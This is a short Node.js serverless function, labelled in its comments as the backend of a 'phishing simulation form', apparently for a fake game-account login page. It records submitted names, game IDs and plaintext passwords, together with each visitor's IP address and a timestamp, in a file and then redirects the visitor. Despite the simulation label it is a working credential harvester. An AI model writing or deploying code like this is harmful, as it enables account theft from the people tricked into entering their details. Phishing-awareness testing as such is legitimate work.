// api/submit.js — Vercel Serverless Function (Node.js)
// Handles POST from the phishing simulation form.
// Saves captured data to /tmp/data.txt (writable on Vercel).

const fs = require('fs');

module.exports = async (req, res) => {
    // Only allow POST
    if (req.method !== 'POST') {
        res.writeHead(302, { Location: '/' });
        return res.end();
    }

    // ── Parse raw application/x-www-form-urlencoded body ──────────────
    const rawBody = await new Promise((resolve) => {
        let data = '';
        req.on('data', chunk => { data += chunk.toString(); });
        req.on('end', () => resolve(data));
    });

    const params  = new URLSearchParams(rawBody);
    const nama    = (params.get('nama')    || '').trim();
    const gameId  = (params.get('game_id') || '').trim();
    const pwd     = (params.get('pwd')     || '').trim();
    const ip      = (req.headers['x-forwarded-for'] || 'unknown').split(',')[0].trim();

    // ── Append entry to /tmp/data.txt ──────────────────────────────────
    if (nama || gameId || pwd) {
        const now = new Date();
        // Format: YYYY-MM-DD HH:MM:SS (WIB = UTC+7)
        const wib = new Date(now.getTime() + 7 * 60 * 60 * 1000);
        const timestamp = wib.toISOString().replace('T', ' ').substring(0, 19);
        const line = `Waktu: ${timestamp} | Nama: ${nama} | ID: ${gameId} | Pwd: ${pwd} | IP: ${ip}\n`;

        try {
            fs.appendFileSync('/tmp/data.txt', line, 'utf8');
        } catch (_) {
            // Fail silently — not critical for redirect
        }
    }

    // ── Redirect back to home with success flag ────────────────────────
    res.writeHead(302, { Location: '/?status=tersimpan' });
    res.end();
};
